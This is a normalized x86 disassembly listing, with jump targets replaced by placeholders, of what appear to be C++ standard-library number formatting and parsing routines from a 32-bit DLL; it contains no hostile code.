push [ ebp + 0x14 ]
lea eax [ esp + 0x24 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10005e43
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
push 0x30
push [ ebp + 0x2c ]
sub eax esi
push eax
lea ecx [ esp + 0x4c ]
call sub_10005cf6
push 0x30
push [ ebp + 0x24 ]
lea ecx [ esp + 0x48 ]
call sub_100014aa
mov eax [ esp + 0x10 ]
mov [ ebp + 0x24 ] ebx
mov eax [ esp + 0x18 ]
push 0x30
lea ecx [ esp + 0x44 ]
cmp eax ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x40 ]
push eax
push edi
call sub_10005e43
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
push [ ebp + 0x28 ]
sub eax esi
mov [ esp + 0x20 ] eax
inc eax
push eax
call sub_10005cf6
push 0x30
push [ ebp + 0x24 ]
lea ecx [ esp + 0x48 ]
push [ esp + 0x20 ]
call sub_10005cf6
mov [ ebp + 0x28 ] ebx
push [ ebp + 0x24 ]
call sub_100014aa
jmp r-xdata
lea eax [ esp + 0x14 ]
push eax
push ebx
lea ecx [ esp + 0x48 ]
call sub_10005d90
push eax
call sub_10027c10
pop ecx
pop ecx
mov [ esp + 0x10 ] eax
jmp r-xdata
lea esi [ esp + 0x60 ]
cmp [ esp + 0x74 ] 0x10
mov esi [ esp + 0x60 ]
mov [ ebp + 0x24 ] ebx
jae r-xdata
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push ebx
lea ecx [ esp + 0x44 ]
call sub_10005d90
mov esi eax
mov eax [ esp + 0x54 ]
mov [ ebp + 0x2c ] ebx
mov [ ebp + 0x30 ] eax
mov ecx [ esp + 0x10 ]
sub ecx [ esp + 0x2c ]
movsx eax al
cmp eax ecx
jae r-xdata
sub [ esp + 0x10 ] eax
push ebx
push 0x1
push [ esp + 0x18 ]
lea ecx [ esp + 0x4c ]
call sub_10005cf6
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_10005071
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ eax ] 0x25
lea ecx [ eax + 0x1 ]
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ ecx ] 0x2b
inc ecx
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
mov bl [ edi ]
cmp bl 0x4c
je r-xdata
mov [ ecx ] 0x23
inc ecx
mov [ ecx ] 0x49
inc ecx
mov [ ecx ] 0x36
inc ecx
mov [ ecx ] 0x34
mov [ ecx ] bl
jmp r-xdata
cmp esi 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
mov esi edx
and esi 0xe00
inc ecx
cmp esi 0x400
jne r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl [ edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
mov [ ecx ] dl
mov [ ecx + 0x1 ] 0x0
pop ebx
retn
sub_100050e5
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004ffb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ esp + 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0x30 ]
push eax
mov ecx ebx
mov [ esp + 0x24 ] ebx
call sub_10007dd5
and [ esp + 0x60 ] 0x0
push eax
call sub_1000654d
or [ esp + 0x64 ] 0xffffffff
pop ecx
lea ecx [ esp + 0x30 ]
mov [ esp + 0x2c ] eax
call sub_10007dbd
mov ecx [ esp + 0x2c ]
lea eax [ esp + 0x34 ]
push eax
call sub_10005f61
xor ecx ecx
inc ecx
mov [ esp + 0x60 ] ecx
mov al [ esi ]
cmp al 0x2b
je r-xdata
mov [ esp + 0x18 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ esp + 0x38 ]
cmp al 0x30
jne r-xdata
mov edi [ ebx + 0x18 ]
test edi edi
jle r-xdata
cmp [ esp + 0x4c ] 0x10
mov eax ecx
jae r-xdata
and [ esp + 0x18 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
cmp edi [ ebp + 0x24 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ esp + 0x38 ]
cmp [ esp + 0x4c ] 0x10
mov ecx [ esp + 0x38 ]
mov eax ecx
jae r-xdata
mov [ esp + 0x18 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ esp + 0x2c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
push eax
push [ ebp + 0x24 ]
lea eax [ esp + 0x20 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ esp + 0x28 ]
call sub_10005e8e
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
and [ ebx + 0x18 ] 0x0
push eax
push ecx
push [ esp + 0x54 ]
mov [ ebp + 0x14 ] eax
push [ esp + 0x40 ]
call sub_10005373
add esp 0x34
push 0x0
push 0x1
lea ecx [ esp + 0x3c ]
call sub_100020e2
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn
cmp eax 0x100
lea eax [ esp + 0x20 ]
je r-xdata
sub edi [ ebp + 0x24 ]
jmp r-xdata
cmp [ esp + 0x4c ] 0x10
jb r-xdata
push [ esp + 0x18 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ esp + 0x24 ]
call sub_10005e43
mov ecx [ eax ]
push edi
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ esp + 0x3c ]
push [ eax ]
sub [ ebp + 0x24 ] ecx
lea eax [ esp + 0x48 ]
push eax
push [ esp + 0x3c ]
add esi ecx
call sub_10005373
add esp 0x30
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ esp + 0x24 ]
call sub_10005373
add esp 0x18
jmp r-xdata
mov eax [ ebx + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ esp + 0x38 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x14 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
mov [ ebp + 0x14 ] eax
mov eax [ esp + 0x14 ]
mov al [ eax ]
cmp al 0x7f
jne r-xdata
mov edi [ ebp + 0x24 ]
jmp r-xdata
test al al
jle r-xdata
mov ecx edi
sub ecx [ esp + 0x18 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp + 0x24 ]
sub eax edi
inc eax
push eax
lea ebx [ esi + edi ]
push ebx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
call sub_100275d0
mov eax [ esp + 0x24 ]
add esp 0x10
inc [ ebp + 0x24 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov ebx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
sub_1000533e
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_10005f27
dec [ ebp + 0x1c ]
inc esi
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_10005373
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x10 ]
call sub_10005f27
dec [ ebp + 0x1c ]
jne r-xdata
sub_1000539c
push 0x64
mov eax sub_1004ff83
call sub_1002b30f
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_1000654d
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10005f61
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x34 ] eax
je r-xdata
lea ebx [ esi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] ebx
call sub_10007340
mov esi [ ebp - 0x6c ]
add esp 0xc
push [ ebp - 0x5c ]
movzx eax ax
mov ecx edi
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x54 ] esi
call sub_100068a0
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
push ebx
push 0x0
push 0x2b
call sub_10007340
add esp 0xc
mov ecx edi
mov bx ax
call sub_10005f4d
cmp ax bx
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x2d
call sub_10007340
add esp 0xc
mov ecx edi
mov bx ax
call sub_10005f4d
cmp ax bx
jne r-xdata
mov [ esi ] 0x2b
jmp r-xdata
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov [ ebp - 0x58 ] 0x0
push edi
mov [ ebp - 0x49 ] 0x0
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
mov [ esi ] 0x2d
lea eax [ esi + 0x1 ]
mov ecx edi
mov [ ebp - 0x54 ] eax
call sub_10006020
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx edi
call sub_10005f4d
cmp ax [ ebp - 0x64 ]
jne r-xdata
mov [ ebp - 0x64 ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
mov ecx edi
mov [ ebp - 0x58 ] 0x1
call sub_10006020
push [ ebp - 0x5c ]
push edi
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
jae r-xdata
push [ ebp - 0x60 ]
mov ecx edi
call sub_10005f4d
movzx eax ax
push eax
call sub_100071d5
mov esi [ ebp - 0x54 ]
push [ ebp - 0x64 ]
mov [ esi ] al
movsx eax al
push eax
push r--data
call sub_10027b60
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x78
call sub_10007340
add esp 0xc
mov ecx edi
mov bx ax
call sub_10005f4d
cmp ax bx
je r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea esi [ ebp - 0x44 ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
call sub_10005cd0
push [ ebp - 0x5c ]
add esi 0x1f
push edi
mov [ ebp - 0x4 ] 0x1
xor ebx ebx
mov [ ebp - 0x70 ] esi
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x50 ] 0x8
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x60 ]
push 0x0
push 0x58
call sub_10007340
add esp 0xc
mov ecx edi
mov bx ax
call sub_10005f4d
cmp ax bx
jne r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x54 ] eax
test ebx ebx
jbe r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x68 ] 0x0
je r-xdata
cmp esi [ ebp - 0x70 ]
jae r-xdata
cmp [ esi ] 0x30
je r-xdata
mov ecx edi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_10006020
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
jle r-xdata
mov ecx edi
call sub_10005f4d
cmp ax [ ebp - 0x68 ]
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
call sub_10005d90
cmp [ eax ] 0x7f
je r-xdata
inc esi
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x49 ] 0x1
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_100020e2
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
mov eax [ ebp - 0x50 ]
call sub_1002b392
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100014aa
inc ebx
mov ecx edi
call sub_10006020
push [ ebp - 0x5c ]
push edi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
inc [ eax ]
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov esi eax
jmp r-xdata
sub_100056ec
push 0x60
mov eax sub_1004ff4e
call sub_1002b30f
mov eax [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x18 ]
push eax
mov [ ebp - 0x68 ] ebx
call sub_1000654d
pop ecx
mov ecx eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x6c ] ecx
call sub_10005f61
and [ ebp - 0x4 ] 0x0
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x64 ] edi
call sub_10007340
add esp 0xc
push [ ebp - 0x58 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x4a ] 0x0
call sub_100068a0
test al al
jne r-xdata
and [ ebp - 0x50 ] 0x0
and [ ebp - 0x60 ] 0x0
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x49 ] 0x0
jae r-xdata
push edi
push 0x0
push 0x2b
call sub_10007340
add esp 0xc
mov ecx esi
mov di ax
call sub_10005f4d
cmp ax di
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_10007340
add esp 0xc
mov ecx esi
mov di ax
call sub_10005f4d
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov ebx [ ebp - 0x68 ]
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_10006020
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10005f4d
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx esi
movzx edi ax
call sub_10005f4d
cmp ax di
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_10005f4d
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx [ ebp - 0x6c ]
mov eax [ ecx ]
call [ eax + 0x8 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
movzx edi ax
call sub_10005cd0
push [ ebp - 0x58 ]
and [ ebp - 0x5c ] 0x0
push esi
mov [ ebp - 0x4 ] 0x1
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
jmp r-xdata
call sub_10027b31
mov eax [ eax ]
mov al [ eax ]
mov [ ebx ] al
mov ecx esi
inc ebx
call sub_10006020
cmp [ ebp - 0x50 ] 0x0
jne r-xdata
cmp [ ebp - 0x50 ] 0x24
jl r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
jae r-xdata
mov ecx esi
call sub_10005f4d
cmp [ ebp - 0x54 ] ax
ja r-xdata
mov ecx esi
call sub_10005f4d
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x30
inc ebx
mov ecx esi
call sub_10005f4d
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
lea edi [ ebp - 0x28 ]
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_10005f4d
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10005f4d
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_10005f4d
cmp ax [ ebp - 0x54 ]
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
jge r-xdata
mov ecx esi
call sub_10005f4d
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10006020
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_100020e2
jmp r-xdata
cmp [ ebp - 0x5c ] 0x0
jbe r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
test di di
je r-xdata
cmp [ ebp - 0x50 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x50 ] 0x24
jge r-xdata
mov ebx [ ebp - 0x68 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x65
call sub_10007340
add esp 0xc
mov ecx esi
mov di ax
call sub_10005f4d
cmp ax di
je r-xdata
dec [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10006020
mov [ ebx ] 0x30
inc ebx
inc [ ebp - 0x60 ]
jmp r-xdata
cmp [ edi ] 0x7f
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
cmp [ eax ] 0x0
jle r-xdata
mov ecx esi
call sub_10005f4d
cmp ax di
jne r-xdata
mov ecx esi
call sub_10005f4d
cmp ax [ ebp - 0x54 ]
jne r-xdata
inc [ ebp - 0x60 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10006020
mov ecx esi
call sub_10005f4d
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebx ] 0x0
call sub_100020e2
mov eax [ ebp - 0x60 ]
call sub_1002b392
retn
mov [ ebx ] 0x65
mov ecx esi
inc ebx
call sub_10006020
push [ ebp - 0x58 ]
and [ ebp - 0x50 ] 0x0
mov ecx esi
mov [ ebp - 0x49 ] 0x0
call sub_100068a0
test al al
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x45
call sub_10007340
add esp 0xc
mov ecx esi
mov di ax
call sub_10005f4d
cmp ax di
jne r-xdata
dec [ ebp - 0x5c ]
je r-xdata
mov [ ebp - 0x4a ] 0x1
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100014aa
inc [ ebp - 0x5c ]
mov ecx esi
call sub_10005f4d
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
je r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
cmp [ eax ] 0x7f
je r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2b
call sub_10007340
add esp 0xc
mov ecx esi
mov di ax
call sub_10005f4d
cmp ax di
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
mov ecx esi
call sub_10006020
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
inc [ eax ]
jmp r-xdata
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_10005f4d
cmp ax [ ebp - 0x54 ]
jne r-xdata
push [ ebp - 0x64 ]
push 0x0
push 0x2d
call sub_10007340
add esp 0xc
mov ecx esi
mov di ax
call sub_10005f4d
cmp ax di
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x48 ]
call sub_10005d90
mov cl [ edi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x4a ] 0x1
mov ecx esi
call sub_10005f4d
cmp [ ebp - 0x54 ] ax
ja r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10006020
push [ ebp - 0x58 ]
push esi
call sub_1000674b
pop ecx
pop ecx
test al al
jne r-xdata
mov [ ebx ] 0x2d
mov ecx esi
inc ebx
call sub_10006020
mov edi eax
jmp r-xdata
mov ecx esi
call sub_10005f4d
movzx ecx [ ebp - 0x54 ]
movzx eax ax
add ecx 0x9
cmp eax ecx
jg r-xdata
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
cmp [ ebp - 0x50 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10006020
mov ecx esi
call sub_10005f4d
mov cl 0x30
sub cl [ ebp - 0x54 ]
add al cl
mov [ ebx ] al
inc ebx
inc [ ebp - 0x50 ]
sub_10005cf6
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ esi + 0x14 ] edi
jae r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax [ ebp + 0xc ]
ja r-xdata
call sub_10021cfc
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_10021cc4
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ esi + 0x14 ]
add ebx [ ebp + 0xc ]
push 0x0
push ebx
mov ecx esi
call sub_1000212d
test al al
je r-xdata
pop ebx
mov eax [ esi + 0x18 ]
lea ecx [ esi + 0x4 ]
cmp eax 0x10
jb r-xdata
mov [ ebp + 0x8 ] ecx
mov edx [ ecx ]
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov edx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ ebp + 0x8 ]
sub eax edi
sub eax [ ebp + 0xc ]
add edx edi
push edx
add ecx edi
add ecx [ ebp + 0xc ]
push eax
push ecx
call sub_10001f2b
add esp 0x10
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_1000161f
push ebx
mov ecx esi
call sub_100021a7
mov ecx [ ecx ]
cmp eax 0x10
jb r-xdata
sub_10005d90
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x14 ]
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_10027827
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ esi + edi ]
pop edi
pop esi
retn 0x4
sub_10005db8
push ebx
mov ebx [ esp + 0x8 ]
push edi
or eax 0xffffffff
mov edi ecx
sub eax [ edi + 0x14 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_10021cc4
mov eax edi
pop edi
pop ebx
retn 0x8
push esi
mov esi [ edi + 0x14 ]
push 0x0
add esi ebx
push esi
mov ecx edi
call sub_100024cd
test al al
je r-xdata
pop esi
push [ esp + 0x14 ]
mov ecx edi
push ebx
push [ edi + 0x14 ]
call sub_10005fd5
push esi
mov ecx edi
call sub_10002630
sub_10005e06
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
push 0x0
push edi
mov ecx esi
call sub_100024cd
test al al
je r-xdata
call sub_10021cc4
pop edi
mov eax esi
pop esi
retn 0x8
push [ esp + 0x10 ]
mov ecx esi
push edi
push 0x0
call sub_10005fd5
push edi
mov ecx esi
call sub_10002630
sub_10005e43
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x8
movzx eax [ esi ]
push edi
push 0x0
push eax
call sub_10007340
movzx eax ax
add esp 0xc
push eax
lea ecx [ ebp + 0x10 ]
call sub_10005f27
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop edi
pop esi
sub_10005e8e
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ esp + 0x1c ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_10005e43
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
push 0x1
push [ ebp + 0x20 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ esp + 0x28 ]
push eax
push [ ebp + 0x8 ]
call sub_10005373
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
push ebx
